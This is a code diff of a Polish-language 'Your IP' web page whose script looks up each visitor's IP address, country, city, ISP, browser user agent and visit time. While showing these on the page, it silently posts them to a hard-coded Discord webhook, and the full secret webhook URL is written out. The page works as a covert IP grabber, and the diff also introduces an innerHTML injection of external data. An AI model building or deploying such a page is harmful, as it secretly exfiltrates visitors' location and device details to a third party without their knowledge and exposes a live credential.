@@ -3,23 +3,40 @@
 <head>
   <meta charset="UTF-8">
   <title>Twoje IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+      padding: 20px;
+    }
+    pre {
+      background-color: #eaeaea;
+      padding: 10px;
+      border-radius: 5px;
+    }
+  </style>
 </head>
 <body>
   <h1>Witaj!</h1>
   <p id="info">Pobieram dane...</p>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1390748518854955188/qNrH-dlXXuUYCzibyXqFgYbsOHFl93qLp89lfESiuA14iTGcdLEBYwk8UrO726qfjODP";
+    const webhookUrl = "https://discord.com/api/webhooks/1390748518854955188/qNrH-dlXXuUYCzibyXqFgYbsOHFl93qLp89lfESiuA14iTGcdLEBYwk8UrO726qfjODP";
 
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
+    async function fetchIPData() {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        if (!response.ok) throw new Error("Nieudane pobranie danych IP.");
+
+        const data = await response.json();
+
         const ip = data.ip;
         const country = data.country_name;
         const city = data.city;
         const isp = data.org;
         const userAgent = navigator.userAgent;
-        const time = new Date().toLocaleString();
+        const time = new Date().toLocaleString("pl-PL");
 
         const content = `
 **📡 Nowe odwiedziny strony**
@@ -34,23 +51,24 @@ Data i czas: ${time}
 `;
 
         // Pokaż na stronie
-        document.getElementById("info").innerText = content;
+        document.getElementById("info").innerHTML = `<pre>${content}</pre>`;
 
         // Wyślij na Discord webhook
-        fetch(webhook, {
+        await fetch(webhookUrl, {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({
-            content: content
-          })
+          body: JSON.stringify({ content })
         });
-      })
-      .catch(err => {
-        document.getElementById("info").innerText = "Nie udało się pobrać danych.";
-        console.error("Błąd:", err);
-      });
+
+      } catch (error) {
+        console.error("Błąd:", error);
+        document.getElementById("info").textContent = "Nie udało się pobrać danych.";
+      }
+    }
+
+    fetchIPData();
   </script>
 </body>
 </html>
